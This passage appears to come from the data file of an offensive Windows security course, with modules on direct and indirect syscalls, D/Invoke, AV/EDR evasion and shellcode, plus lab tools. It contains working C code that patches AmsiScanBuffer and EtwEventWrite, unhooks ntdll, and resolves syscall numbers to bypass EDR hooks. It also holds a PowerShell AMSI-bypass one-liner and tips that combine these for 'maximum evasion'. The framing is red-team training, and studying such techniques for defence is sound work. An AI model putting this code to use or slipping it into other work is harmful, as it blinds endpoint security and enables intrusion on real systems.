;     ULONG_PTR ZeroBits,       // r8
;     PSIZE_T RegionSize,       // r9
;     ULONG AllocationType,     // stack
;     ULONG Protect             // stack
; );`,
            language: "asm"
          },
          warning: `SSNs change between Windows versions! Using a hardcoded SSN will crash on the wrong Windows version. Always dynamically resolve SSNs.`
        },
        {
          title: "Hell's Gate - Dynamic SSN Resolution",
          content: `Hell's Gate dynamically resolves System Service Numbers by parsing ntdll.dll in memory, avoiding hardcoded values that break across Windows versions.

**The Technique:**
1. Get ntdll.dll base address (from PEB)
2. Parse PE export directory
3. Find target NT function by name
4. Read bytes at function address
5. Extract SSN from 'mov eax, <SSN>' instruction
6. Use extracted SSN for direct syscall

**Pattern Matching:**
Unhooked functions have predictable bytes:
\`4C 8B D1\` - mov r10, rcx
\`B8 XX XX 00 00\` - mov eax, SSN (XX XX = SSN as WORD)
\`0F 05\` - syscall
\`C3\` - ret

If function starts with \`E9\` (JMP) or \`FF 25\` (JMP [rip+offset]), it's hooked.`,
          example: {
            title: "Hell's Gate SSN Extraction",
            code: `#include <windows.h>
#include <stdio.h>

// Syscall stub structure
typedef struct _SYSCALL_ENTRY {
    DWORD ssn;
    PVOID address;
} SYSCALL_ENTRY;

// Extract SSN from ntdll function
BOOL GetSyscallNumber(LPCSTR functionName, SYSCALL_ENTRY* entry) {
    // Get ntdll base from PEB
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    
    // Get function address
    PVOID funcAddr = GetProcAddress(ntdll, functionName);
    if (!funcAddr) return FALSE;
    
    entry->address = funcAddr;
    PBYTE bytes = (PBYTE)funcAddr;
    
    // Check for hook (JMP instruction)
    if (bytes[0] == 0xE9 || bytes[0] == 0xFF) {
        printf("[-] %s is hooked!\\n", functionName);
        return FALSE;
    }
    
    // Pattern: mov r10, rcx; mov eax, SSN
    // 4C 8B D1 | B8 XX XX 00 00
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
        bytes[3] == 0xB8) {
        // SSN is at offset 4 (little-endian WORD)
        entry->ssn = *(PDWORD)(bytes + 4);
        printf("[+] %s SSN: 0x%X (%d)\\n", 
               functionName, entry->ssn, entry->ssn);
        return TRUE;
    }
    
    printf("[-] Unexpected pattern for %s\\n", functionName);
    return FALSE;
}

int main() {
    SYSCALL_ENTRY entries[5];
    
    GetSyscallNumber("NtAllocateVirtualMemory", &entries[0]);
    GetSyscallNumber("NtWriteVirtualMemory", &entries[1]);
    GetSyscallNumber("NtProtectVirtualMemory", &entries[2]);
    GetSyscallNumber("NtCreateThreadEx", &entries[3]);
    GetSyscallNumber("NtWaitForSingleObject", &entries[4]);
    
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Indirect Syscalls",
          content: `Indirect syscalls add another layer of evasion by executing the 'syscall' instruction from within ntdll.dll itself, making the call stack appear more legitimate.

**Why Indirect Syscalls?**
• Some EDRs examine the return address on syscall
• Direct syscalls return to your code (suspicious)
• Indirect syscalls return to ntdll.dll (legitimate-looking)
• Call stack analysis shows ntdll, not your executable

**Implementation:**
1. Find ntdll function (as in Hell's Gate)
2. Extract SSN
3. Find 'syscall; ret' gadget within ntdll
4. Call gadget with SSN in RAX and proper arguments

**Finding the Gadget:**
Search ntdll for bytes: \`0F 05 C3\` (syscall; ret)
Or use the syscall instruction inside any NT function.`,
          example: {
            title: "Indirect Syscall Implementation",
            code: `#include <windows.h>
#include <stdio.h>

// Find syscall gadget in ntdll
PVOID FindSyscallGadget() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    
    PBYTE base = (PBYTE)ntdll;
    SIZE_T size = nt->OptionalHeader.SizeOfImage;
    
    // Search for syscall; ret (0F 05 C3)
    for (SIZE_T i = 0; i < size - 3; i++) {
        if (base[i] == 0x0F && base[i+1] == 0x05 && base[i+2] == 0xC3) {
            printf("[+] Found syscall gadget at 0x%p\\n", base + i);
            return base + i;
        }
    }
    return NULL;
}

// Indirect syscall wrapper (simplified - needs ASM for real implementation)
typedef NTSTATUS (*pSyscallGadget)(void);

// In real implementation, use assembly:
// mov r10, rcx
// mov eax, <SSN>
// jmp <gadget_address>  ; Instead of 'syscall'

int main() {
    PVOID gadget = FindSyscallGadget();
    if (!gadget) {
        printf("[-] Could not find syscall gadget\\n");
        return 1;
    }
    
    // Now use this gadget address in your syscall stub
    // instead of directly using the 'syscall' instruction
    
    return 0;
}`,
            language: "c"
          },
          tip: `Combine Hell's Gate (for SSN resolution) with indirect syscalls (for legitimate-looking call stacks) for maximum evasion.`
        }
      ]
    },
    pinvoke: {
      title: "P/Invoke & .NET Interop",
      description: "Calling native Windows APIs from managed .NET code",
      sections: [
        {
          type: "intro",
          content: `P/Invoke (Platform Invocation Services) enables C# and other .NET languages to call unmanaged functions in native DLLs like kernel32.dll and ntdll.dll. This capability is essential for Windows security tools written in C#.`
        },
        {
          title: "P/Invoke Fundamentals",
          content: `P/Invoke bridges the managed (.NET) and unmanaged (native) worlds using the DllImport attribute and careful type marshaling.

**Basic Structure:**
\`\`\`
[DllImport("dll.name", CharSet, SetLastError, ...)]
static extern ReturnType FunctionName(parameters);
\`\`\`

**Key DllImport Parameters:**
• DllName - Target DLL (kernel32.dll, ntdll.dll, etc.)
• CharSet - Character encoding (CharSet.Unicode for W functions)
• SetLastError - Capture GetLastError() value
• CallingConvention - Usually Cdecl or StdCall
• EntryPoint - Actual function name if different

**Type Mappings:**
• HANDLE → IntPtr
• DWORD → uint or UInt32
• BOOL → bool (with MarshalAs if needed)
• LPVOID → IntPtr
• LPWSTR → string or StringBuilder
• BYTE* → byte[] or IntPtr`,
          example: {
            title: "Basic P/Invoke Examples",
            code: `using System;
using System.Runtime.InteropServices;

class NativeMethods {
    // Simple function - no special marshaling
    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentProcessId();
    
    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentThreadId();
    
    // SetLastError captures error code
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    // CharSet for string handling
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr CreateFileW(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
    
    // Bool requires explicit marshaling
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    // Constants
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint GENERIC_READ = 0x80000000;
    public const uint OPEN_EXISTING = 3;
}

class Program {
    static void Main() {
        Console.WriteLine($"PID: {NativeMethods.GetCurrentProcessId()}");
        Console.WriteLine($"TID: {NativeMethods.GetCurrentThreadId()}");
        
        IntPtr hProcess = NativeMethods.OpenProcess(
            NativeMethods.PROCESS_ALL_ACCESS,
            false,
            NativeMethods.GetCurrentProcessId()
        );
        
        if (hProcess != IntPtr.Zero) {
            Console.WriteLine($"Handle: 0x{hProcess.ToInt64():X}");
            NativeMethods.CloseHandle(hProcess);
        } else {
            Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
        }
    }
}`,
            language: "csharp"
          }
        },
        {
          title: "Structure Marshaling",
          content: `Complex Windows APIs require passing structures. These must be carefully defined with matching layout and marshaling attributes.

**StructLayout Attribute:**
• LayoutKind.Sequential - Fields in declared order (default)
• LayoutKind.Explicit - Manually specified offsets (for unions)

**Common Patterns:**
• Size field - Many structures require cb/dwSize set before use
• Arrays - Fixed size with MarshalAs(UnmanagedType.ByValArray)
• Strings - MarshalAs(UnmanagedType.ByValTStr) for inline strings
• Pointers - IntPtr for any pointer type`,
          example: {
            title: "Structure Marshaling Examples",
            code: `using System;
using System.Runtime.InteropServices;

// Basic structure
[StructLayout(LayoutKind.Sequential)]
public struct MEMORY_BASIC_INFORMATION {
    public IntPtr BaseAddress;
    public IntPtr AllocationBase;
    public uint AllocationProtect;
    public IntPtr RegionSize;
    public uint State;
    public uint Protect;
    public uint Type;
}

// Structure with size field
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct PROCESSENTRY32W {
    public uint dwSize;
    public uint cntUsage;
    public uint th32ProcessID;
    public IntPtr th32DefaultHeapID;
    public uint th32ModuleID;
    public uint cntThreads;
    public uint th32ParentProcessID;
    public int pcPriClassBase;
    public uint dwFlags;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
    public string szExeFile;
}

// Union using explicit layout
[StructLayout(LayoutKind.Explicit)]
public struct INPUT_RECORD {
    [FieldOffset(0)] public ushort EventType;
    [FieldOffset(4)] public KEY_EVENT_RECORD KeyEvent;
    [FieldOffset(4)] public MOUSE_EVENT_RECORD MouseEvent;
}

class NativeMethods {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualQuery(
        IntPtr lpAddress,
        out MEMORY_BASIC_INFORMATION lpBuffer,
        IntPtr dwLength
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(
        uint dwFlags,
        uint th32ProcessID
    );
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool Process32FirstW(
        IntPtr hSnapshot,
        ref PROCESSENTRY32W lppe
    );
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool Process32NextW(
        IntPtr hSnapshot,
        ref PROCESSENTRY32W lppe
    );
    
    public const uint TH32CS_SNAPPROCESS = 0x00000002;
}

class Program {
    static void EnumerateProcesses() {
        IntPtr snapshot = NativeMethods.CreateToolhelp32Snapshot(
            NativeMethods.TH32CS_SNAPPROCESS, 0);
        
        if (snapshot == IntPtr.Zero - 1) {
            Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
            return;
        }
        
        PROCESSENTRY32W pe = new PROCESSENTRY32W();
        pe.dwSize = (uint)Marshal.SizeOf(pe);  // CRITICAL!
        
        if (NativeMethods.Process32FirstW(snapshot, ref pe)) {
            do {
                Console.WriteLine($"[{pe.th32ProcessID,5}] {pe.szExeFile}");
            } while (NativeMethods.Process32NextW(snapshot, ref pe));
        }
    }
}`,
            language: "csharp"
          },
          warning: `Always set the size field (dwSize, cb, etc.) before calling functions! This is a common source of ERROR_INVALID_PARAMETER (87).`
        },
        {
          title: "D/Invoke - Dynamic Invocation",
          content: `D/Invoke is an alternative to P/Invoke that dynamically resolves and calls functions at runtime, avoiding static imports that are easily detected by security tools.

**Advantages over P/Invoke:**
• No import table entries for suspicious functions
• Can call functions from manually mapped DLLs
• Supports syscall execution
• Harder for static analysis to detect

**Key Techniques:**
1. GetProcAddress - Resolve function by name at runtime
2. GetModuleHandle - Find loaded DLL base
3. Marshal.GetDelegateForFunctionPointer - Create callable delegate
4. Dynamic delegate types matching function signature`,
          example: {
            title: "D/Invoke Pattern",
            code: `using System;
using System.Runtime.InteropServices;

class DInvoke {
    // Delegate matching VirtualAlloc signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    // Minimal P/Invoke for bootstrapping
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr GetModuleHandleW(string lpModuleName);
    
    static T GetDelegate<T>(string dll, string function) where T : Delegate {
        IntPtr hModule = GetModuleHandleW(dll);
        IntPtr pFunc = GetProcAddress(hModule, function);
        return Marshal.GetDelegateForFunctionPointer<T>(pFunc);
    }
    
    public static void Main() {
        // Dynamically resolve VirtualAlloc
        var virtualAlloc = GetDelegate<VirtualAllocDelegate>(
            "kernel32.dll", 
            "VirtualAlloc"
        );
        
        // Call it without static import!
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        
        IntPtr mem = virtualAlloc(
            IntPtr.Zero,
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        Console.WriteLine($"[+] Allocated: 0x{mem.ToInt64():X}");
        
        // No "VirtualAlloc" in our import table!
    }
}`,
            language: "csharp"
          },
          tip: `Combine D/Invoke with syscalls for maximum evasion - resolve ntdll functions dynamically, extract SSNs, and make direct syscalls from C#.`
        }
      ]
    },
    evasion: {
      title: "AV/EDR Evasion Techniques",
      description: "Bypassing security products through various evasion methods",
      sections: [
        {
          type: "intro",
          content: `Modern endpoint security products use multiple detection layers: signature scanning, behavioral analysis, API hooking, and kernel callbacks. Effective evasion requires understanding and bypassing each layer. This module covers common evasion techniques used in red team operations.`
        },
        {
          title: "AMSI Bypass Techniques",
          content: `The Antimalware Scan Interface (AMSI) provides a standardized interface for applications to request scans of content at runtime. PowerShell, VBScript, JScript, and .NET all use AMSI.

**How AMSI Works:**
1. Application calls AmsiScanBuffer/AmsiScanString with content
2. AMSI passes to registered provider (typically Windows Defender)
3. Provider returns AMSI_RESULT (Clean, NotDetected, Detected)
4. Application decides whether to execute

**Bypass Strategies:**
1. **Memory Patching** - Modify AmsiScanBuffer to return clean
2. **amsiContext Corruption** - Null out the AMSI context
3. **amsiInitFailed** - Force initialization failure
4. **Provider Hijacking** - Redirect to benign provider
5. **Reflection** - Use .NET reflection to modify internal state`,
          warning: `AMSI bypasses are well-known and often detected. The bypass itself may trigger alerts. Obfuscation is essential.`,
          example: {
            title: "AMSI Patch (Educational)",
            code: `#include <windows.h>
#include <stdio.h>

// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) {
        printf("[*] AMSI not loaded\\n");
        return TRUE;
    }
    
    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] AmsiScanBuffer not found\\n");
        return FALSE;
    }
    
    printf("[*] AmsiScanBuffer at: 0x%p\\n", pAmsiScanBuffer);
    
    // Patch bytes: xor eax, eax; ret (return 0 = clean)
    // 31 C0 C3
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 };
    
    // Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\\n", GetLastError());
        return FALSE;
    }
    
    // Apply patch
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // Restore protection
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    printf("[+] AMSI patched!\\n");
    return TRUE;
}

// PowerShell equivalent (heavily obfuscated in practice):
// [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
//   .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
            language: "c"
          }
        },
        {
          title: "ETW Patching",
          content: `Event Tracing for Windows (ETW) is a high-performance logging mechanism. Many security tools consume ETW events for visibility into process behavior.

**ETW in Security:**
• .NET runtime emits ETW for assembly loads, JIT compilation
• PowerShell logs all script blocks to ETW
• Process creation, network connections logged
• Security tools subscribe to these events

**Bypass Approach:**
Patch ntdll!EtwEventWrite to immediately return, preventing events from being generated.

**Detection Concerns:**
• ETW is also used by legitimate diagnostics
• Patching may cause application instability
• Some EDRs detect ETW tampering`,
          example: {
            title: "ETW Bypass",
            code: `#include <windows.h>
#include <stdio.h>

BOOL DisableETW() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    
    // Find EtwEventWrite
    PVOID pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] EtwEventWrite not found\\n");
        return FALSE;
    }
    
    printf("[*] EtwEventWrite: 0x%p\\n", pEtwEventWrite);
    
    // Patch: ret (just return immediately)
    // Could also: xor eax, eax; ret (return STATUS_SUCCESS)
    unsigned char patch[] = { 0xC3 };  // Simple ret
    
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    printf("[+] ETW patched!\\n");
    return TRUE;
}`,
            language: "c"
          }
        },
        {
          title: "API Unhooking",
          content: `EDR products hook API functions by modifying the first bytes (prologue) to redirect execution to their monitoring code. Unhooking restores the original bytes.

**Hooking Indicators:**
• JMP instruction at function start (E9 XX XX XX XX)
• JMP [rip+offset] for 64-bit (FF 25 XX XX XX XX)
• Unusual bytes where mov r10, rcx; mov eax, SSN expected

**Unhooking Techniques:**
1. **Fresh DLL mapping** - Map clean ntdll from disk, copy .text
2. **Suspended process** - Read ntdll from newly created process
3. **KnownDlls** - Read from \\KnownDlls\\ntdll.dll
4. **Syscall reconstruction** - Rebuild syscall stubs from SSN

**Fresh Copy Sources:**
• C:\\Windows\\System32\\ntdll.dll (may be on-disk scanned)
• \\KnownDlls\\ntdll.dll (section object)
• Suspended child process memory`,
          example: {
            title: "Unhook from Fresh DLL",
            code: `#include <windows.h>
#include <stdio.h>

BOOL UnhookNtdll() {
    // Map fresh copy of ntdll from disk
    HANDLE hFile = CreateFileW(
        L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    PVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Get current ntdll base
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    // Parse PE to find .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((PBYTE)pCleanNtdll + dosHeader->e_lfanew);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            PVOID localText = (PBYTE)hNtdll + section[i].VirtualAddress;
            PVOID cleanText = (PBYTE)pCleanNtdll + section[i].PointerToRawData;
            SIZE_T textSize = section[i].SizeOfRawData;
            
            // Make writable
            DWORD oldProtect;
            VirtualProtect(localText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            
            // Copy clean .text over hooked version
            memcpy(localText, cleanText, textSize);
            
            // Restore protection
            VirtualProtect(localText, textSize, oldProtect, &oldProtect);
            
            printf("[+] Restored %llu bytes of ntdll .text\\n", textSize);
            break;
        }
    }
    
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}`,
            language: "c"
          },
          tip: `Combine unhooking with direct syscalls. Unhook first to evade inline hooks, then use syscalls to bypass any remaining user-mode monitoring.`
        }
      ]
    },
    shellcode: {
      title: "Shellcode Development",
      description: "Creating position-independent code for payload delivery",
      sections: [
        {
          type: "intro",
          content: `Shellcode is position-independent machine code that can execute from any memory address. Unlike normal executables, shellcode cannot rely on the loader - it must resolve its own dependencies at runtime. This module covers shellcode development fundamentals for x64 Windows.`
        },
        {
          title: "Position-Independent Code Basics",
          content: `Shellcode must work regardless of where it's loaded in memory. This requires specific coding techniques and avoiding certain constructs.

**Key Requirements:**
• No absolute addresses (no global variables)
• No imports - must resolve dynamically
• Self-contained - all data embedded in code
• Avoid null bytes (for string-based exploits)

**Accessing Data:**
• LEA instruction with RIP-relative addressing
• Call-pop technique to get current address
• Delta offset calculation

**Register Conventions (x64):**
• RAX - Return value, SSN for syscalls
• RCX, RDX, R8, R9 - First four arguments
• R10 - Used instead of RCX for syscalls
• GS - Points to TEB (segment register)`,
          example: {
            title: "RIP-Relative Data Access",
            code: `; x64 NASM - Getting current address and data
BITS 64

section .text
global _start

_start:
    ; Method 1: RIP-relative LEA
    lea rax, [rel message]    ; Load address of message
    
    ; Method 2: Call-pop technique  
    jmp get_eip
got_eip:
    pop rbx                   ; RBX = address of 'got_eip'
    ; Now calculate offsets from RBX
    
    ; Method 3: Direct RIP-relative
    lea rsi, [rip]            ; RSI = current instruction pointer
    
    ret

get_eip:
    call got_eip              ; Push return address and jump

message:
    db "Hello", 0             ; Embedded string data`,
            language: "asm"
          }
        },
        {
          title: "Resolving Kernel32 and APIs",
          content: `Shellcode must find kernel32.dll and resolve function addresses without using GetProcAddress (which itself needs to be resolved).

**The Resolution Chain:**
1. Access TEB via GS segment register
2. Get PEB from TEB+0x60
3. Get Ldr (PEB_LDR_DATA) from PEB+0x18
4. Walk InMemoryOrderModuleList
5. Find kernel32.dll (usually third entry)
6. Parse PE exports to find GetProcAddress
7. Use GetProcAddress for remaining functions

**Module Order (typical):**
1. Executable itself
2. ntdll.dll
3. kernel32.dll (or kernelbase.dll on Win7+)

**Export Resolution:**
Parse PE export directory:
• AddressOfNames - Array of function name RVAs
• AddressOfNameOrdinals - Ordinal index for each name
• AddressOfFunctions - Array of function RVAs`,
          example: {
            title: "Finding Kernel32 Base Address",
            code: `; x64 NASM - Get kernel32.dll base address
BITS 64

section .text
global GetKernel32Base

GetKernel32Base:
    ; TEB is at gs:[0]
    ; PEB is at TEB+0x60
    mov rax, gs:[0x60]        ; RAX = PEB
    
    ; PEB_LDR_DATA is at PEB+0x18
    mov rax, [rax + 0x18]     ; RAX = Ldr
    
    ; InMemoryOrderModuleList is at Ldr+0x20
    mov rax, [rax + 0x20]     ; RAX = First entry (exe)
    mov rax, [rax]            ; RAX = Second entry (ntdll)
    mov rax, [rax]            ; RAX = Third entry (kernel32)
    
    ; DllBase is at entry+0x20 (in InMemoryOrder list)
    mov rax, [rax + 0x20]     ; RAX = kernel32 base
    
    ret

; More robust version checks DLL name instead of assuming order
; Hash the DLL name and compare against known kernel32 hash`,
            language: "asm"
          },
          tip: `On Windows 7+, the third module is often kernelbase.dll, not kernel32.dll. Robust shellcode should hash-compare module names rather than relying on load order.`
        },
        {
          title: "Complete Shellcode Example",
          content: `A complete shellcode implementation that resolves APIs and calls MessageBox.

**Structure:**
1. Get kernel32 base
2. Find GetProcAddress export
3. Resolve LoadLibraryA
4. Load user32.dll
5. Resolve MessageBoxA
6. Call MessageBoxA with parameters
7. Exit cleanly

**Optimization Considerations:**
• Minimize size (especially for buffer overflow exploits)
• Avoid null bytes
• Consider encoding/encryption for evasion`,
          example: {
            title: "MessageBox Shellcode Skeleton",
            code: `; x64 Shellcode - Call MessageBoxA
BITS 64

section .text
global _start

_start:
    ; Save registers (optional, for clean exit)
    push rbp
    mov rbp, rsp
    sub rsp, 0x40                ; Shadow space + alignment
    
    ; ========== Get kernel32 base ==========
    mov rax, gs:[0x60]           ; PEB
    mov rax, [rax + 0x18]        ; Ldr
    mov rax, [rax + 0x20]        ; InMemoryOrderModuleList
    mov rax, [rax]               ; ntdll
    mov rax, [rax]               ; kernel32 (or kernelbase)
    mov r12, [rax + 0x20]        ; R12 = kernel32 base (save)
    
    ; ========== Find GetProcAddress ==========
    ; Parse PE export directory
    ; (Implementation omitted for brevity)
    ; R13 = GetProcAddress address
    
    ; ========== Resolve LoadLibraryA ==========
    lea rcx, [rel sLoadLibraryA] ; Function name
    mov rdx, r12                 ; kernel32 base
    ; call find_export          ; R14 = LoadLibraryA
    
    ; ========== Load user32.dll ==========
    lea rcx, [rel sUser32]       ; "user32.dll"
    call r14                     ; LoadLibraryA
    mov r15, rax                 ; R15 = user32 base
    
    ; ========== Resolve MessageBoxA ==========
    lea rcx, [rel sMessageBoxA]
    mov rdx, r15
    ; call find_export          ; RBX = MessageBoxA
    
    ; ========== Call MessageBoxA ==========
    xor rcx, rcx                 ; hWnd = NULL
    lea rdx, [rel sText]         ; lpText
    lea r8, [rel sTitle]         ; lpCaption
    xor r9, r9                   ; uType = MB_OK
    call rbx
    
    ; ========== Clean exit ==========
    add rsp, 0x40
    pop rbp
    ret

; ========== Data Section ==========
sLoadLibraryA: db "LoadLibraryA", 0
sUser32:       db "user32.dll", 0
sMessageBoxA:  db "MessageBoxA", 0
sText:         db "Shellcode Executed!", 0
sTitle:        db "Success", 0`,
            language: "asm"
          },
          warning: `This is a skeleton - production shellcode needs proper export parsing, error handling, and often encoding to avoid detection. Never use hardcoded offsets across Windows versions.`
        }
      ]
    },
    labs: {
      title: "Practical Security Labs",
      description: "Build real security tools with step-by-step guidance",
      sections: [
        {
          type: "intro",
          content: `These hands-on labs guide you through building actual security tools. Each lab includes complete, working code that you can compile and experiment with. These projects reinforce the concepts from earlier modules and give you practical experience.`
        },
        {
          title: "Lab 1: Process Memory Dumper",
          content: `Build a tool that dumps memory regions from a running process - useful for malware analysis and memory forensics.

**What You'll Build:**
• Open a process by PID
• Enumerate all memory regions
• Read and dump committed memory
• Save to file with region metadata

**Key APIs:**
• OpenProcess
• VirtualQueryEx
• ReadProcessMemory
• CreateFile / WriteFile`,
          example: {
            title: "Memory Dumper Implementation",
            code: `#include <windows.h>
#include <stdio.h>

BOOL DumpProcessMemory(DWORD pid, LPCWSTR outputPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid
    );
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\\n", GetLastError());
        return FALSE;
    }
    
    HANDLE hFile = CreateFileW(
        outputPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    DWORD totalDumped = 0;
    
    printf("[*] Dumping process %lu...\\n\\n", pid);
    
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
        // Only dump committed, readable memory
        if (mbi.State == MEM_COMMIT && 
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | 
                           PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
            
            PBYTE buffer = (PBYTE)malloc(mbi.RegionSize);
            SIZE_T bytesRead;
            
            if (ReadProcessMemory(hProcess, mbi.BaseAddress, 
                                  buffer, mbi.RegionSize, &bytesRead)) {
                
                // Write region header
                DWORD written;
                WriteFile(hFile, &mbi.BaseAddress, sizeof(PVOID), &written, NULL);
                WriteFile(hFile, &bytesRead, sizeof(SIZE_T), &written, NULL);
                WriteFile(hFile, buffer, (DWORD)bytesRead, &written, NULL);
                
                printf("[+] Dumped 0x%p - 0x%p (%llu KB)\\n",
                    mbi.BaseAddress,
                    (PBYTE)mbi.BaseAddress + bytesRead,
                    bytesRead / 1024);
                
                totalDumped += (DWORD)bytesRead;
            }
            free(buffer);
        }
        
        address = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    
    printf("\\n[+] Total dumped: %lu bytes\\n", totalDumped);
    
    CloseHandle(hFile);
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <output.dmp>\\n", argv[0]);
        return 1;
    }
    
    DWORD pid = atoi(argv[1]);
    WCHAR output[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, output, MAX_PATH);
    
    DumpProcessMemory(pid, output);
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Lab 2: Pattern Scanner",
          content: `Create a memory pattern scanner - essential for finding code caves, signatures, or specific data structures in process memory.

**Features:**
• Scan memory for byte patterns
• Support for wildcards (masked search)
• Report all matches with addresses
• Optionally patch matched locations`,
          example: {
            title: "Pattern Scanner Implementation",
            code: `#include <windows.h>
#include <stdio.h>

typedef struct {
    PVOID address;
    SIZE_T size;
} SCAN_RESULT;

BOOL PatternMatch(PBYTE data, PBYTE pattern, PBYTE mask, SIZE_T patternSize) {
    for (SIZE_T i = 0; i < patternSize; i++) {
        if (mask[i] == 'x' && data[i] != pattern[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

DWORD ScanPattern(
    HANDLE hProcess,
    PBYTE pattern,
    PBYTE mask,
    SIZE_T patternSize,
    SCAN_RESULT* results,
    DWORD maxResults
) {
    DWORD found = 0;
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) && 
           found < maxResults) {
        
        if (mbi.State == MEM_COMMIT &&
            !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS))) {
            
            PBYTE buffer = (PBYTE)malloc(mbi.RegionSize);
            SIZE_T bytesRead;
            
            if (ReadProcessMemory(hProcess, mbi.BaseAddress,
                                  buffer, mbi.RegionSize, &bytesRead)) {
                
                // Scan buffer for pattern
                for (SIZE_T i = 0; i <= bytesRead - patternSize; i++) {
